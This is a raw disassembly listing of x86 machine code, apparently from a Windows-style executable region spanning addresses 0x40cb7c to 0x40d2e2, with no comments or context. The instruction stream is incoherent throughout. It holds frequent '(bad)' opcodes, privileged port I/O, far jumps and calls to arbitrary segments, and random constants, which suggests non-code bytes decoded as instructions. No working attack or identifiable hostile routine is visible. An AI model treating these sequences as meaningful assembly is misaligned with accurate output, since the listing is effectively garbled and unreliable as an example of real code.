  40cb7c:	outs   dx,BYTE PTR ds:[esi]
  40cb7d:	sbb    BYTE PTR [eax-0x3],0xb4
  40cb81:	jo     0x40cbe5
  40cb83:	dec    ebp
  40cb84:	or     DWORD PTR [edx+0x5e4197c3],eax
  40cb8a:	pop    edx
  40cb8b:	pop    ebx
  40cb8c:	scas   al,BYTE PTR es:[edi]
  40cb8d:	lahf   
  40cb8e:	aaa    
  40cb8f:	mov    eax,ds:0xd49c167d
  40cb94:	scas   al,BYTE PTR es:[edi]
  40cb95:	dec    ecx
  40cb96:	push   0xffffff80
  40cb98:	addr16 out 0xff,eax
  40cb9b:	mov    ss:0xb20c613d,al
  40cba1:	imul   ecx,DWORD PTR [ebx+edx*8-0x13d7c805],0x1b9b01c
  40cbac:	rol    BYTE PTR [eax],1
  40cbae:	and    al,0xb9
  40cbb0:	(bad)  
  40cbb1:	into   
  40cbb2:	xor    BYTE PTR [edi+0x30e340e0],ah
  40cbb8:	pop    eax
  40cbb9:	in     eax,dx
  40cbba:	pop    esp
  40cbbb:	mov    eax,ds:0x3335045
  40cbc0:	jg     0x40cbeb
  40cbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc3:	dec    esp
  40cbc4:	adc    eax,esp
  40cbc6:	retf   0x3199
  40cbc9:	lock shr BYTE PTR [ecx+eiz*1-0xcac3346],cl
  40cbd1:	sbb    ebp,DWORD PTR [ebp-0x4016a8f9]
  40cbd7:	into   
  40cbd8:	rol    DWORD PTR [esi+eax*8-0x4a],0x1c
  40cbdd:	fistp  DWORD PTR [ebx-0x7]
  40cbe0:	xchg   ecx,eax
  40cbe1:	loope  0x40cc5f
  40cbe3:	push   cs
  40cbe4:	mov    ebp,0xa754ef32
  40cbe9:	ror    BYTE PTR [si],0xca
  40cbed:	mov    BYTE PTR [ecx],bl
  40cbef:	xchg   edx,eax
  40cbf0:	cwde   
  40cbf1:	stos   BYTE PTR es:[edi],al
  40cbf2:	cld    
  40cbf3:	dec    ebx
  40cbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf5:	sbb    BYTE PTR [eax+0x6],ch
  40cbf8:	fs cld 
  40cbfa:	fild   WORD PTR [ebx+0x4d]
  40cbfd:	(bad)  
  40cbfe:	mov    al,0x6a
  40cc00:	fmul   QWORD PTR [ebp+0x10]
  40cc03:	cdq    
  40cc04:	rol    DWORD PTR [esi],1
  40cc06:	push   es
  40cc07:	mov    edx,0x1a070af3
  40cc0c:	pushf  
  40cc0d:	pop    edx
  40cc0e:	hlt    
  40cc0f:	test   BYTE PTR [ecx-0xf],al
  40cc12:	lds    esp,FWORD PTR [ebp-0x54]
  40cc15:	out    0x12,al
  40cc17:	push   ecx
  40cc18:	es cs pop esp
  40cc1b:	pop    ds
  40cc1c:	or     eax,0x996f905
  40cc21:	hlt    
  40cc22:	add    esi,edi
  40cc24:	cs aas 
  40cc26:	(bad)  
  40cc27:	add    eax,0x56f6552
  40cc2c:	push   ss
  40cc2d:	push   0xffffffff
  40cc2f:	iret   
  40cc30:	fcom   st(2)
  40cc32:	retf   0x163d
  40cc35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc36:	sti    
  40cc37:	mov    cl,0x2f
  40cc39:	les    ecx,FWORD PTR [esi]
  40cc3b:	mov    esi,0x6f4b336a
  40cc40:	pop    es
  40cc41:	mov    eax,ds:0x87794435
  40cc46:	mov    bh,0xd5
  40cc48:	loopne 0x40cbe3
  40cc4a:	inc    eax
  40cc4b:	dec    esi
  40cc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc4d:	ds cs call 0xb24c:0x8f136b70
  40cc56:	daa    
  40cc57:	push   eax
  40cc58:	dec    eax
  40cc59:	out    0x30,eax
  40cc5b:	sbb    ebp,ebx
  40cc5d:	jb     0x40ccdc
  40cc5f:	push   ecx
  40cc60:	jmp    FWORD PTR [edi]
  40cc62:	ret    
  40cc63:	pop    DWORD PTR [edi+eax*1-0x59]
  40cc67:	pop    ebp
  40cc68:	jmp    0x40cc20
  40cc6a:	lahf   
  40cc6b:	mov    bh,0x9a
  40cc6d:	aam    0xe7
  40cc6f:	ja     0x40cc0a
  40cc71:	fidiv  WORD PTR [ecx-0x6c]
  40cc74:	outs   dx,BYTE PTR ds:[esi]
  40cc75:	les    edx,FWORD PTR [edi]
  40cc77:	mov    ss,WORD PTR [edx+0x32268d3b]
  40cc7d:	sub    al,0xb3
  40cc7f:	mov    bl,0xf2
  40cc81:	push   cs
  40cc82:	mov    bh,0x8d
  40cc84:	mov    ecx,0xf8225f57
  40cc89:	rcr    BYTE PTR [eax-0x57],0x3e
  40cc8d:	dec    edx
  40cc8e:	sbb    DWORD PTR [ebx+0x48364265],edi
  40cc94:	sub    esi,edi
  40cc96:	xor    eax,0xe4ad829f
  40cc9b:	mov    edx,0x881fd86
  40cca0:	leave  
  40cca1:	aaa    
  40cca2:	or     DWORD PTR [ecx+0xbc80937],0x8c2eb87c
  40ccac:	ins    DWORD PTR es:[edi],dx
  40ccad:	adc    eax,0x730e8a18
  40ccb2:	jg     0x40cc99
  40ccb4:	push   es
  40ccb5:	or     DWORD PTR [ebx+0x48],ebp
  40ccb8:	jl     0x40cc63
  40ccba:	inc    esi
  40ccbb:	test   DWORD PTR [edi+0x60a45664],ebx
  40ccc1:	addr16 ret 0xe526
  40ccc5:	mov    fs,eax
  40ccc7:	pop    ss
  40ccc8:	xchg   ebp,eax
  40ccc9:	out    0xbd,eax
  40cccb:	mov    ecx,0x8ef3d318
  40ccd0:	call   0xfcfe3daf
  40ccd5:	lock xchg DWORD PTR [ebx-0x5a4ad2c3],edx
  40ccdc:	pop    ds
  40ccdd:	add    eax,DWORD PTR [eax+0x2a86bd53]
  40cce3:	ja     0x40cc95
  40cce5:	aad    0x8f
  40cce7:	out    dx,al
  40cce8:	fsubr  DWORD PTR [edx-0x1a665e86]
  40ccee:	push   0xb176f47f
  40ccf3:	mov    ah,0x98
  40ccf5:	nop
  40ccf6:	mov    WORD PTR [eax+ecx*1+0x3d674980],es
  40ccfd:	adc    eax,0x545e3ab
  40cd02:	jae    0x40ccc9
  40cd04:	and    DWORD PTR [esi],esi
  40cd06:	or     ecx,DWORD PTR [edx-0x520d48ff]
  40cd0c:	mov    WORD PTR cs:[edx+0x7e],?
  40cd10:	push   esi
  40cd11:	jo     0x40cccf
  40cd13:	in     al,0x92
  40cd15:	rol    BYTE PTR [eax-0x5b],cl
  40cd18:	repnz (bad) 
  40cd1b:	test   BYTE PTR [edi-0x58],bl
  40cd1e:	push   ds
  40cd1f:	xor    al,0x92
  40cd21:	pop    eax
  40cd22:	mov    ds:0x50fae563,al
  40cd27:	in     al,0xb9
  40cd29:	inc    edx
  40cd2a:	xchg   DWORD PTR es:[ebp+ebp*1+0x108e5b65],ecx
  40cd32:	sbb    eax,DWORD PTR [edx-0x7f021b9d]
  40cd38:	ja     0x40cdb4
  40cd3a:	cwde   
  40cd3b:	hlt    
  40cd3c:	inc    esi
  40cd3d:	arpl   bx,ax
  40cd3f:	daa    
  40cd40:	xor    al,0xe7
  40cd42:	pop    esi
  40cd43:	jnp    0x40cd60
  40cd45:	(bad)  
  40cd46:	cli    
  40cd47:	mov    ds:0x200d1593,eax
  40cd4c:	ret    
  40cd4d:	jge    0x40cce4
  40cd4f:	and    esp,DWORD PTR [edi+0x3cd6eb0f]
  40cd55:	test   dh,dl
  40cd57:	lods   eax,DWORD PTR ds:[esi]
  40cd58:	stos   BYTE PTR es:[edi],al
  40cd59:	jo     0x40cd31
  40cd5b:	jge    0x40cd51
  40cd5d:	sbb    DWORD PTR [ebp+edx*8+0x7],0xffffffc7
  40cd62:	xor    eax,0x609baae6
  40cd67:	and    al,0x2a
  40cd69:	or     al,0xf7
  40cd6b:	lahf   
  40cd6c:	aad    0x9e
  40cd6e:	ror    DWORD PTR [esi+0x3cf17194],0x11
  40cd75:	ins    BYTE PTR es:[edi],dx
  40cd76:	or     al,0x1d
  40cd78:	jne    0x40cd1f
  40cd7a:	repnz sub DWORD PTR [ebx+esi*2+0x45],0xffffffa7
  40cd80:	jp     0xf6314932
  40cd86:	jle    0x40cd33
  40cd88:	dec    eax
  40cd89:	cs out 0xed,eax
  40cd8c:	jns    0x40cd7f
  40cd8e:	es jp  0x40cd51
  40cd91:	mov    dl,ah
  40cd93:	dec    edi
  40cd94:	mov    cl,0xbc
  40cd96:	stos   BYTE PTR es:[edi],al
  40cd97:	ret    0x4f00
  40cd9a:	cli    
  40cd9b:	sub    eax,0x6319e881
  40cda0:	mov    dl,0x3d
  40cda2:	out    0xc6,al
  40cda4:	and    edi,esp
  40cda6:	fcmovbe st,st(2)
  40cda8:	clc    
  40cda9:	stc    
  40cdaa:	xor    esp,DWORD PTR [edx]
  40cdac:	sbb    BYTE PTR [ecx],bh
  40cdae:	adc    eax,0x9924aa9
  40cdb3:	scas   al,BYTE PTR es:[edi]
  40cdb4:	mov    esi,0x940f327e
  40cdb9:	pop    esp
  40cdba:	test   esp,ebp
  40cdbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdbd:	and    esp,eax
  40cdbf:	cdq    
  40cdc0:	mov    al,0x82
  40cdc2:	mov    cl,0x89
  40cdc4:	test   BYTE PTR [eax+0x17],0xf5
  40cdc8:	rcr    ah,1
  40cdca:	sub    BYTE PTR [esp+eax*1-0x4703e3d1],ah
  40cdd1:	and    edx,DWORD PTR [ebp-0x6ae92f9c]
  40cdd7:	jb     0x40ce32
  40cdd9:	mov    ds:0xe4f0a719,eax
  40cdde:	dec    esp
  40cddf:	or     ah,al
  40cde1:	mov    esi,0xd079f9b2
  40cde6:	pushf  
  40cde7:	jg     0x40cd6d
  40cde9:	jecxz  0x40cdce
  40cdeb:	out    0x30,al
  40cded:	mov    edx,ebx
  40cdef:	jecxz  0x40cd7c
  40cdf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf2:	xor    ecx,DWORD PTR [edx-0x6d]
  40cdf5:	es sub ecx,eax
  40cdf8:	adc    bh,BYTE PTR [esi+0x5ddc8cda]
  40cdfe:	mov    edx,0x6be0cfd4
  40ce03:	imul   esp,DWORD PTR [edx],0x2d83f58c
  40ce09:	jae    0x40ce0c
  40ce0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce0c:	outs   dx,DWORD PTR ds:[esi]
  40ce0d:	cmp    DWORD PTR fs:[eax+esi*8+0x4e4a4704],0xffffffe7
  40ce16:	jg     0x40ce8c
  40ce18:	(bad)  
  40ce1a:	adc    ebx,DWORD PTR [esi]
  40ce1c:	(bad)  
  40ce1d:	cs mov edi,esi
  40ce20:	mov    ss,WORD PTR [edi+0x11c45c6a]
  40ce26:	jae    0x40ce1b
  40ce28:	nop
  40ce29:	cmp    dl,BYTE PTR [esi-0x33049216]
  40ce2f:	add    eax,0x1ba5197a
  40ce34:	adc    BYTE PTR [eax],dh
  40ce36:	je     0x40ce58
  40ce38:	push   ecx
  40ce39:	ret    0x658e
  40ce3c:	mov    cs,ecx
  40ce3e:	imul   BYTE PTR [esi-0x57]
  40ce41:	xchg   edx,eax
  40ce42:	mov    WORD PTR [eax+ebp*1],gs
  40ce45:	fwait
  40ce46:	stc    
  40ce47:	or     edi,DWORD PTR [edi+0x71]
  40ce4a:	in     al,0x9e
  40ce4c:	sub    eax,0xb955d72c
  40ce51:	push   ebx
  40ce52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce53:	das    
  40ce54:	mov    ah,0xa5
  40ce56:	aam    0xf
  40ce58:	jp     0x40cec3
  40ce5a:	add    eax,0x826de68e
  40ce5f:	sub    eax,0x7908613a
  40ce64:	cmp    DWORD PTR [ebx],0x78
  40ce67:	sub    BYTE PTR [ebx-0x3aa48a5a],0xba
  40ce6e:	jmp    0x40cee7
  40ce70:	in     al,0x32
  40ce72:	rcl    BYTE PTR [ebx-0xb9d8fb2],0xdb
  40ce79:	mov    al,0xec
  40ce7b:	xchg   edx,eax
  40ce7c:	aad    0x5d
  40ce7e:	ja     0x40ced2
  40ce80:	jbe    0x40ce4c
  40ce82:	mov    eax,ds:0xb0e0b0f5
  40ce87:	ins    BYTE PTR es:[edi],dx
  40ce88:	dec    ecx
  40ce89:	mov    dh,BYTE PTR [edi]
  40ce8b:	jae    0x40cf02
  40ce8d:	ja     0x40ced7
  40ce8f:	adc    eax,0xff561a29
  40ce94:	or     eax,0xcf4c9b05
  40ce99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce9a:	frstor [esi+0x9]
  40ce9d:	add    ch,BYTE PTR [esi+0x4ea26716]
  40cea3:	push   edx
  40cea4:	pop    esp
  40cea5:	jmp    0x5b93527
  40ceaa:	inc    esp
  40ceab:	popa   
  40ceac:	mov    ds:0xcc8093de,eax
  40ceb1:	add    eax,DWORD PTR [edi]
  40ceb3:	mov    ah,0x9a
  40ceb5:	or     bl,BYTE PTR [ebx]
  40ceb7:	xchg   esi,eax
  40ceb8:	sahf   
  40ceb9:	fisttp WORD PTR [eax-0x27]
  40cebc:	pop    ebx
  40cebd:	enter  0xf57b,0x9f
  40cec1:	in     al,dx
  40cec2:	pop    edx
  40cec3:	inc    ebp
  40cec4:	ret    0x7f4b
  40cec7:	sub    esp,DWORD PTR [ecx-0x18]
  40ceca:	sub    bl,BYTE PTR [edx-0x6e9e4528]
  40ced0:	fs push 0xffffff94
  40ced3:	adc    BYTE PTR [ebp+0x60],al
  40ced6:	cmp    BYTE PTR [edi],cl
  40ced8:	lahf   
  40ced9:	stos   BYTE PTR es:[edi],al
  40ceda:	jno    0x40ce69
  40cedc:	retf   
  40cedd:	cmp    esi,ecx
  40cedf:	outs   dx,BYTE PTR ds:[esi]
  40cee0:	jecxz  0x40ceac
  40cee2:	cwde   
  40cee3:	shl    bl,1
  40cee5:	sub    eax,0x6560aeda
  40ceea:	and    ecx,DWORD PTR [eax-0x37974078]
  40cef0:	fcmovu st,st(6)
  40cef2:	jnp    0x40cf39
  40cef4:	push   cs
  40cef5:	jge    0x40cef9
  40cef7:	retf   
  40cef8:	inc    ebp
  40cef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cefa:	jle    0x40ce89
  40cefc:	sub    DWORD PTR [esi],0x38
  40ceff:	jnp    0x40cf76
  40cf01:	repnz xlat BYTE PTR ds:[ebx]
  40cf03:	mov    bl,0x7e
  40cf05:	hlt    
  40cf06:	jmp    0x6e51:0x6e32b88a
  40cf0d:	mov    esp,0x232b9faa
  40cf12:	push   cs
  40cf13:	dec    edi
  40cf14:	push   cs
  40cf15:	dec    edx
  40cf16:	push   edi
  40cf17:	(bad)  
  40cf18:	cmp    eax,0xbde342d3
  40cf1d:	mov    ds:0x140bb653,al
  40cf22:	sbb    DWORD PTR ds:0xe71d59f1,0x29587af7
  40cf2c:	add    al,0xd7
  40cf2e:	mov    esp,0x912acc6d
  40cf33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf34:	aaa    
  40cf35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf36:	dec    eax
  40cf37:	adc    eax,0x3230c855
  40cf3c:	js     0x40cee1
  40cf3e:	aaa    
  40cf3f:	fs test ebx,edi
  40cf42:	imul   edi,DWORD PTR [edi+0x542f89eb],0x7a
  40cf49:	adc    al,0x39
  40cf4b:	loope  0x40cf7d
  40cf4d:	sbb    esp,DWORD PTR [eax]
  40cf4f:	mov    ecx,0x17761ceb
  40cf54:	adc    al,BYTE PTR [esp+eax*4]
  40cf57:	pop    esp
  40cf58:	push   ebx
  40cf59:	leave  
  40cf5a:	inc    esp
  40cf5b:	test   al,0xa3
  40cf5d:	xchg   DWORD PTR [ecx+ebp*8-0x122b69d2],esi
  40cf64:	mov    eax,0x121b55aa
  40cf69:	ss push esi
  40cf6b:	call   0x886b:0xdc5fd359
  40cf72:	icebp  
  40cf73:	scas   al,BYTE PTR es:[edi]
  40cf74:	dec    esi
  40cf75:	in     al,dx
  40cf76:	div    DWORD PTR [ebx+0x7]
  40cf79:	not    bh
  40cf7b:	cmc    
  40cf7c:	loope  0x40cfd2
  40cf7e:	cmp    ecx,DWORD PTR [esp+ecx*2+0x39]
  40cf82:	ins    DWORD PTR es:[edi],dx
  40cf83:	push   ebx
  40cf84:	xor    eax,0x862ae57b
  40cf89:	retf   0xf43f
  40cf8c:	xor    edx,ebp
  40cf8e:	mov    ebp,0xbf0a2b60
  40cf93:	dec    edi
  40cf94:	cli    
  40cf95:	push   ebx
  40cf96:	(bad)  
  40cf97:	in     eax,dx
  40cf98:	pop    edx
  40cf99:	std    
  40cf9a:	jne    0x40cf2b
  40cf9c:	sub    edx,DWORD PTR [edx]
  40cf9e:	mov    ah,0x77
  40cfa0:	shr    DWORD PTR [di+0x610f],0x23
  40cfa6:	shr    DWORD PTR [edx],cl
  40cfa8:	into   
  40cfa9:	sbb    eax,0x87ef4954
  40cfae:	(bad)  
  40cfaf:	mov    al,0x9e
  40cfb1:	adc    DWORD PTR [edx-0x448400be],ebp
  40cfb7:	ins    BYTE PTR es:[edi],dx
  40cfb8:	jmp    FWORD PTR [ebx]
  40cfba:	xchg   ebx,eax
  40cfbb:	and    BYTE PTR [edi-0x234d95cd],bh
  40cfc1:	dec    esp
  40cfc2:	enter  0x2a9b,0x41
  40cfc6:	imul   edi,DWORD PTR [eax+0x6fd51413],0x27
  40cfcd:	sete   BYTE PTR ds:0xe6c33057
  40cfd4:	mov    al,0x55
  40cfd6:	pop    ds
  40cfd7:	add    ch,BYTE PTR [esi-0x3f]
  40cfda:	pop    ss
  40cfdb:	cmp    DWORD PTR [edi+0x3c],esp
  40cfde:	jns    0x40cf65
  40cfe0:	enter  0x3b86,0x42
  40cfe4:	pushw  ss
  40cfe6:	push   es
  40cfe7:	call   0xa2b5:0x628a1229
  40cfee:	cmp    ecx,DWORD PTR cs:[esp+eax*1]
  40cff2:	bound  esp,QWORD PTR [edx-0x1dbe66e0]
  40cff8:	loope  0x40cff8
  40cffa:	inc    esi
  40cffb:	adc    ebx,DWORD PTR [ebx-0x1374a427]
  40d001:	out    dx,al
  40d002:	sub    BYTE PTR [ecx-0x12],dh
  40d005:	(bad)  
  40d006:	or     DWORD PTR [ecx+eax*8-0x42766be3],eax
  40d00d:	add    DWORD PTR [ebx-0x28],0x13d691bd
  40d014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d015:	(bad)  
  40d016:	cmp    edx,DWORD PTR [edx*1+0x50420447]
  40d01d:	jae    0x40d06f
  40d01f:	ja     0x40d098
  40d021:	mov    edi,0xac524ffa
  40d026:	out    0x1,eax
  40d028:	lahf   
  40d029:	or     eax,0x98f69f5c
  40d02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d02f:	add    DWORD PTR [eax+0x75],edx
  40d032:	push   0xffffffd7
  40d034:	push   edi
  40d035:	xor    edi,DWORD PTR [edx+0x4d]
  40d038:	rol    BYTE PTR [eax+0x2664ad0f],1
  40d03e:	stos   BYTE PTR es:[edi],al
  40d03f:	mov    edx,0xb221426d
  40d044:	mov    ss,esp
  40d046:	adc    bl,BYTE PTR [eax+esi*1+0xafb9376]
  40d04d:	mov    ebp,0xa60a0e60
  40d052:	push   edx
  40d053:	leave  
  40d054:	mov    ecx,eax
  40d056:	(bad)  
  40d057:	(bad)  
  40d058:	loopne 0x40d03f
  40d05a:	div    ch
  40d05c:	repnz and DWORD PTR [ecx-0x59],ecx
  40d060:	push   ss
  40d061:	outs   dx,DWORD PTR ds:[esi]
  40d062:	mov    ds:0xc8182bee,al
  40d067:	(bad)  
  40d068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d069:	pop    ebp
  40d06a:	dec    edi
  40d06b:	xchg   BYTE PTR [ebx],dh
  40d06d:	adc    BYTE PTR [edi],bl
  40d06f:	lahf   
  40d070:	sbb    ch,BYTE PTR [esi-0x3158e24d]
  40d076:	mov    WORD PTR [esp+ebp*1],cs
  40d079:	pop    edx
  40d07a:	fistp  WORD PTR [edx-0x3c]
  40d07d:	lods   eax,DWORD PTR ds:[esi]
  40d07e:	inc    eax
  40d07f:	mov    eax,ds:0x7a81113d
  40d084:	shr    BYTE PTR [ecx-0x60e289b7],cl
  40d08a:	cmc    
  40d08b:	retf   0xbfcb
  40d08e:	xor    dl,al
  40d090:	test   al,0x9e
  40d092:	ja     0x40d0e7
  40d094:	mov    al,ds:0xb9ad293c
  40d099:	xor    al,BYTE PTR [ebx+0x7ef85499]
  40d09f:	xlat   BYTE PTR ds:[ebx]
  40d0a0:	jo     0x40d10a
  40d0a2:	(bad)  
  40d0a3:	into   
  40d0a4:	(bad)  
  40d0a5:	sub    dh,bl
  40d0a7:	jmp    0x4975:0xdcf605b9
  40d0ae:	dec    edx
  40d0af:	jl     0x40d0ee
  40d0b1:	push   es
  40d0b2:	mov    ch,0xf7
  40d0b4:	fisttp WORD PTR [edi+0x5ed008c4]
  40d0ba:	ret    0x2150
  40d0bd:	aaa    
  40d0be:	push   0xc6ab9f3d
  40d0c3:	jo     0x40d0e2
  40d0c5:	and    al,0x5e
  40d0c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c9:	adc    cl,BYTE PTR [ecx]
  40d0cb:	arpl   WORD PTR [ebx],bx
  40d0cd:	mov    edx,0xe70c8bb5
  40d0d2:	cmp    al,0xdc
  40d0d4:	push   edi
  40d0d5:	es push esp
  40d0d7:	test   al,0xe6
  40d0d9:	jl     0x40d07d
  40d0db:	jmp    DWORD PTR ds:0xcc20c5c4
  40d0e1:	and    eax,0x8e85986e
  40d0e6:	xor    edi,DWORD PTR [esi]
  40d0e8:	mov    ebp,0xb54e0f39
  40d0ed:	scas   al,BYTE PTR es:[edi]
  40d0ee:	jp     0x40d0c1
  40d0f0:	(bad)  
  40d0f1:	sar    DWORD PTR [edx],1
  40d0f3:	mov    edi,0xe726a496
  40d0f8:	or     eax,0x1fc3f5e6
  40d0fd:	push   edi
  40d0fe:	jge    0x40d13a
  40d100:	fiadd  WORD PTR [ebx+0x2dbfbb9f]
  40d106:	bound  ecx,QWORD PTR [edx+0x2e1a2678]
  40d10c:	mov    esp,0x83194105
  40d111:	(bad)  
  40d112:	push   edi
  40d113:	push   esi
  40d114:	not    DWORD PTR ds:0x56bcce72
  40d11a:	leave  
  40d11b:	pushf  
  40d11c:	xlat   BYTE PTR ds:[ebx]
  40d11d:	xlat   BYTE PTR ds:[ebx]
  40d11e:	xor    eax,0x3edc1827
  40d123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d124:	push   esp
  40d125:	hlt    
  40d126:	mov    DWORD PTR [edi],ebx
  40d128:	addr16 add eax,0xaeed8d54
  40d12e:	and    BYTE PTR [esi-0x35789fe5],0xd5
  40d135:	fst    QWORD PTR [ebp-0x6cbd1c43]
  40d13b:	push   edi
  40d13c:	sti    
  40d13d:	stos   BYTE PTR es:[edi],al
  40d13e:	in     al,0x89
  40d140:	lods   eax,DWORD PTR ds:[esi]
  40d141:	retf   0xfe8b
  40d144:	imul   esi,DWORD PTR [esi-0x28],0xa5892c7c
  40d14b:	xor    eax,0x6ed9b38f
  40d150:	xor    eax,esp
  40d152:	fidivr WORD PTR [edi]
  40d154:	lock in eax,dx
  40d156:	dec    esp
  40d157:	xchg   edi,eax
  40d158:	out    dx,eax
  40d159:	xor    BYTE PTR [edi+0x52],dh
  40d15c:	test   al,0xe4
  40d15e:	jle    0x40d14e
  40d160:	jns    0x40d0fe
  40d162:	cmc    
  40d163:	test   BYTE PTR [edx+eiz*8+0x27],0x94
  40d168:	xor    BYTE PTR [edx+0x37],ah
  40d16b:	mov    ebx,0xa1f31a34
  40d170:	fistp  QWORD PTR [edx-0x1a64dc3]
  40d176:	loop   0x40d183
  40d178:	cmp    DWORD PTR ds:0x770d182,esp
  40d17e:	div    DWORD PTR [ebx+0x21]
  40d181:	mov    eax,0x3ab54cb3
  40d186:	cmp    BYTE PTR [eax-0x2d],bl
  40d189:	sub    BYTE PTR [ebx],0x6
  40d18c:	add    esi,DWORD PTR [edx+0x50966302]
  40d192:	jle    0x40d1c4
  40d194:	inc    esp
  40d195:	mov    ds:0x8bf2fb7a,al
  40d19a:	adc    esi,DWORD PTR [ebx+0x3e09aecc]
  40d1a0:	push   ecx
  40d1a1:	jae    0x40d131
  40d1a3:	xor    esi,DWORD PTR [edi+0x4]
  40d1a6:	xchg   BYTE PTR [ebx-0x24],cl
  40d1a9:	xchg   ebp,eax
  40d1aa:	scas   eax,DWORD PTR es:[edi]
  40d1ab:	cmc    
  40d1ac:	test   al,ch
  40d1ae:	jb     0x40d16d
  40d1b0:	xor    edi,DWORD PTR [edx+0x2a]
  40d1b3:	inc    ecx
  40d1b4:	lea    ebx,[ebx+0x6d]
  40d1b7:	or     eax,0xb86e518d
  40d1bc:	sbb    al,0x7d
  40d1be:	mov    bh,bh
  40d1c0:	sub    DWORD PTR [ebp+0x5a],0xffffff8a
  40d1c4:	push   es
  40d1c5:	cdq    
  40d1c6:	add    ch,cl
  40d1c8:	js     0x40d1f0
  40d1ca:	mov    dh,0xd6
  40d1cc:	lds    eax,FWORD PTR [ecx]
  40d1ce:	add    cl,BYTE PTR [edx+0x39]
  40d1d1:	fistp  WORD PTR [edx-0x384414b6]
  40d1d7:	mov    eax,ds:0xe710aadc
  40d1dc:	fldenv ds:0xdd3e445f
  40d1e2:	mov    edi,0x7a7a1006
  40d1e7:	icebp  
  40d1e8:	push   0x4a27a20a
  40d1ed:	stc    
  40d1ee:	test   BYTE PTR [edx-0x4df7d774],dl
  40d1f4:	pop    ebp
  40d1f5:	add    eax,DWORD PTR [esi]
  40d1f7:	add    eax,0x2eec2e53
  40d1fc:	sbb    esi,esp
  40d1fe:	std    
  40d1ff:	loop   0x40d1c4
  40d201:	sti    
  40d202:	mov    BYTE PTR [ecx+0x7f5793a6],dl
  40d208:	xor    ebx,DWORD PTR [esi-0xf46c7b]
  40d20e:	mov    ds:0x9a86c4be,al
  40d213:	adc    DWORD PTR [edx-0x296dda9e],edx
  40d219:	cld    
  40d21a:	mov    DWORD PTR [ebx],esi
  40d21c:	pop    esp
  40d21d:	(bad)  
  40d21e:	outs   dx,BYTE PTR ds:[esi]
  40d21f:	lea    eax,[edx]
  40d221:	shl    DWORD PTR [esi],cl
  40d223:	cmp    eax,0x30571230
  40d228:	loopne 0x40d1c8
  40d22a:	dec    ebp
  40d22b:	mov    ebp,DWORD PTR [ebx+esi*1+0x41]
  40d22f:	mul    ebx
  40d231:	sbb    BYTE PTR [esi+0x13],0xd9
  40d235:	stc    
  40d236:	std    
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	mov    esp,0x46d45b13
  40d23d:	popf   
  40d23e:	ins    DWORD PTR es:[edi],dx
  40d23f:	sbb    dh,BYTE PTR [esi+0x516120c4]
  40d245:	retf   0x28df
  40d248:	ins    BYTE PTR es:[edi],dx
  40d249:	scas   al,BYTE PTR es:[edi]
  40d24a:	loope  0x40d205
  40d24c:	mov    ch,0xb4
  40d24e:	aad    0x85
  40d250:	xchg   ax,ax
  40d252:	pop    ss
  40d253:	sbb    ah,BYTE PTR [edi+0x62]
  40d256:	aad    0x23
  40d258:	outs   dx,BYTE PTR ds:[esi]
  40d259:	(bad)  
  40d25a:	or     al,0x7b
  40d25c:	test   DWORD PTR [ebx],ebp
  40d25e:	aaa    
  40d25f:	sbb    bl,bh
  40d261:	pushf  
  40d262:	sub    eax,0x32ae14f5
  40d267:	loope  0x40d24d
  40d269:	jo     0x40d28f
  40d26b:	push   cs
  40d26c:	cmp    DWORD PTR [eax+0x6438d28d],0x6e
  40d273:	pop    ss
  40d274:	push   esp
  40d275:	fadd   st,st(5)
  40d277:	mov    edi,0xebce02bd
  40d27c:	dec    ecx
  40d27d:	cmc    
  40d27e:	push   0x5297418
  40d283:	mov    ah,0x64
  40d285:	in     al,dx
  40d286:	push   cs
  40d287:	push   eax
  40d288:	cmp    DWORD PTR [edi+eax*2+0x49],0x88929660
  40d290:	mov    ch,0x2e
  40d292:	nop
  40d293:	(bad)  
  40d295:	js     0x40d25b
  40d297:	push   cs
  40d298:	push   0x500c3b6f
  40d29d:	jns    0x40d28f
  40d29f:	icebp  
  40d2a0:	cmp    eax,0x66e0aed4
  40d2a5:	cmp    esp,DWORD PTR [ebx]
  40d2a7:	xor    ebx,edx
  40d2a9:	aam    0xd7
  40d2ab:	sbb    al,dh
  40d2ad:	idiv   DWORD PTR [ebx]
  40d2af:	sbb    edi,ebp
  40d2b1:	xlat   BYTE PTR ds:[ebx]
  40d2b2:	xchg   ebx,eax
  40d2b3:	and    al,0x4b
  40d2b5:	mov    esp,0x3e85a84d
  40d2ba:	jecxz  0x40d272
  40d2bc:	add    eax,0x63f84a1a
  40d2c1:	in     eax,0x33
  40d2c3:	mov    bl,0xa0
  40d2c5:	push   ecx
  40d2c6:	fadd   DWORD PTR gs:[eax-0x1]
  40d2ca:	retf   
  40d2cb:	cmp    bh,BYTE PTR [eax+0xea5854c]
  40d2d1:	mov    al,0xa1
  40d2d3:	dec    esi
  40d2d4:	xor    al,0xfe
  40d2d6:	fadd   st(6),st
  40d2d8:	jb     0x40d354
  40d2da:	dec    ebp
  40d2db:	ins    BYTE PTR es:[edi],dx
  40d2dc:	cli    
  40d2dd:	aam    0x6c
  40d2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2e0:	into   
  40d2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2e2:	rcr    BYTE PTR [ebp-0x3c189905],1
